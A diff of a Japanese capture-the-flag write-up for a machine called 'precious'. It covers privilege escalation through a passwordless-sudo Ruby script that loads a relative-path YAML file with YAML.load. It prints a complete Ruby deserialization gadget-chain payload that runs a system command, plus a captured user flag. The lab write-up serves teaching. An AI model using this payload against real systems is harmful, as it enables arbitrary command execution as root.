@@ -119,18 +119,19 @@ uid=1000(henry) gid=1000(henry) groups=1000(henry)
 
 
 SHELL=/bin/bash script -q /dev/null
-henry@precious:~$
+henry@precious:/var/www/pdfapp$
 
 
-henry@precious:~$ cat /home/henry/user.txt
+henry@precious:/var/www/pdfapp$ cat /home/henry/user.txt
 cat /home/henry/user.txt
 e3948152e2e4cd28f2c967ffcc412a53
 ```
 
 
 ## STEP 4
+パスワードなしでroot権限でrubyを実行できそう
 ```sh
-henry@precious:~$ sudo -l
+henry@precious:/var/www/pdfapp$ sudo -l
 sudo -l
 Matching Defaults entries for henry on precious:
     env_reset, mail_badpass,
@@ -139,6 +140,14 @@ Matching Defaults entries for henry on precious:
 User henry may run the following commands on precious:
     (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
 ```
+「/opt/update_dependencies.rb」を確認  
+dependencies.ymlの中身は
+```yaml
+rails: "6.1.4"
+rake: "13.0.6"
+```
+のようなバージョンが書いてあると仮定し  
+dependencies.yml内のバージョンと、実際にインストールされているバージョンを比較するスクリプトっぽい
 ```ruby
 # Compare installed dependencies with those specified in "dependencies.yml"
 require "yaml"
@@ -171,7 +180,30 @@ gems_file.each do |file_name, file_version|
     end
 end
 ```
-
+が、`YAML.load()`でyamlを読み込むとクラスを生成してしまうのでそこからコマンド実行の脆弱性があるらしい  
+またdependencies.ymlは絶対パスでないため、攻撃者のyaml経由でコマンド実行できる
+[PoC](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)があるので、git_setでリバースシェルコマンドに編集
+```sh
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
 ```sh
 henry@precious:~$ cd /home/henry
 cd /home/henry
